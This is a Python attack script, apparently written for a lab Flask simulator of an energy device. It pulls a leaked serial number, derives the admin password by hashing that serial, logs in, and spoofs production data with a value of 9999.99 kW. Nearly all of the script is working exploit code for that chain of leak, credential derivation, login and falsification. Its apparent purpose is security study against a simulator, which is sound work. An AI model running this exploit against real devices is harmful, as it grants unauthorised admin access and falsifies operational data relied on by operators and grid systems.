import requests
import hashlib
from utils.logger import log_message

TARGET = "http://localhost:5000"  # URL of the Flask sim

def run_spoof_attack():
    log_message('[*] Running spoof attack...', "INFO")

    # Simulate serial number leak and derive password
    resp = requests.get(f"{TARGET}/info")
    serial = resp.json().get("serial_number")
    log_message(f"[+] Serial number leaked: {serial}", "INFO")

    # Generate password using serial number
    password = generate_password(serial)
    log_message(f"[+] Derived password: {password}", "INFO")

    # Log in using the derived password
    login_resp = requests.post(f"{TARGET}/api/login", json={"username": "admin", "password": password})
    if login_resp.status_code != 200:
        log_message("[-] Login failed", "ERROR")
        return
    token = login_resp.json()["token"]
    log_message(f"[+] Auth token received: {token}", "INFO")

    # Spoof production data
    spoof_resp = requests.post(f"{TARGET}/api/spoof", headers={"Authorization": token}, json={"production_kw": 9999.99})
    if spoof_resp.status_code == 200:
        log_message(f"[+] Successfully spoofed production data.", "INFO")
    else:
        log_message(f"[-] Failed to spoof data: {spoof_resp.json()}", "ERROR")

def generate_password(serial):
    return hashlib.sha256(serial.encode()).hexdigest()[:8]
